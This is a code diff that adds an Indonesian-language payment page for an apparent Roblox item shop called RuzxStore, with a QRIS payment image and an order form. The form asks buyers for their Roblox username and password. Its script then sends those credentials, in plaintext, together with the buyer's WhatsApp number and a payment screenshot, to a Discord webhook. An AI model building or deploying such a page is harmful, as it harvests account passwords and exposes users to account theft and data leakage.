@@ -1,1 +1,92 @@
-<h1>Pembayaran</h1>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Payment - RuzxStore</title>
+  <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+<h1>💳 PAYMENT</h1>
+
+<div class="box">
+  <p><b>Produk:</b> <span id="produk"></span></p>
+  <p><b>Harga:</b> Rp <span id="harga"></span></p>
+</div>
+
+<hr>
+
+<h3>📋 Data Akun</h3>
+<form id="orderForm">
+  <input type="text" id="username" placeholder="Username Roblox" required>
+  <input type="password" id="password" placeholder="Password Roblox" required>
+  <input type="text" id="whatsapp" placeholder="No WhatsApp (08xxxx)" required>
+
+  <h3>💰 Pembayaran</h3>
+  <p>
+    Silakan bayar via <b>QRIS</b><br>
+    <b>Atas Nama: Denna</b>
+  </p>
+
+  <!-- QRIS PNG -->
+  <img src="assets/qris.png" alt="QRIS" style="max-width:220px;border-radius:10px">
+
+  <p style="margin-top:12px">Upload Bukti Pembayaran:</p>
+  <input type="file" id="bukti" accept="image/*" required>
+
+  <br><br>
+  <button type="submit">KIRIM ORDER</button>
+</form>
+
+<script>
+  // Ambil data dari URL
+  const params = new URLSearchParams(window.location.search);
+  const produk = params.get("produk");
+  const harga = params.get("harga");
+
+  document.getElementById("produk").innerText = produk;
+  document.getElementById("harga").innerText = harga;
+
+  // GANTI DENGAN WEBHOOK DISCORD LU
+  const WEBHOOK_URL = "ISI_WEBHOOK_DISCORD_LU_DI_SINI";
+
+  document.getElementById("orderForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const whatsapp = document.getElementById("whatsapp").value;
+    const bukti = document.getElementById("bukti").files[0];
+
+    const reader = new FileReader();
+    reader.onloadend = function () {
+      const payload = {
+        content:
+`📥 **ORDER BARU - RUZX STORE**
+━━━━━━━━━━━━━━
+🛒 Produk: ${produk}
+💰 Harga: Rp ${harga}
+
+👤 Username: ${username}
+🔑 Password: ${password}
+📞 WhatsApp: ${whatsapp}
+
+🧾 Bukti Pembayaran:
+${reader.result}`
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        window.location.href = "done.html";
+      });
+    };
+
+    reader.readAsDataURL(bukti);
+  });
+</script>
+
+</body>
+</html>
